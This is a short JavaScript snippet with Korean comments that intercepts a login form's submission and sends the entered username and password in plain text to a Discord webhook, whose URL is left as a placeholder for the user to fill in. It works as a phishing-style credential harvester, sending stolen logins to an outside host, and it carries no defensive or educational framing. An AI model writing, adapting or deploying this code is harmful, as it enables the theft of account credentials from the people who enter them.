document.getElementById('loginForm').addEventListener('submit', function(event) {
    event.preventDefault(); // 기본 제출 동작 방지

    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;

    const webhookURL = 'YOUR_DISCORD_WEBHOOK_URL'; // 여기에 Discord 웹훅 URL을 입력하세요.

    const data = {
        content: `아이디: ${username}, 비밀번호: ${password}`
    };

    fetch(webhookURL, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
    })
    .then(response => {
        if (response.ok) {
            alert('로그인 정보가 전송되었습니다.');
        } else {
            alert('전송 실패: ' + response.statusText);
        }
    })
    .catch(error => {
        console.error('Error:', error);
        alert('전송 중 오류가 발생했습니다.');
    });
});
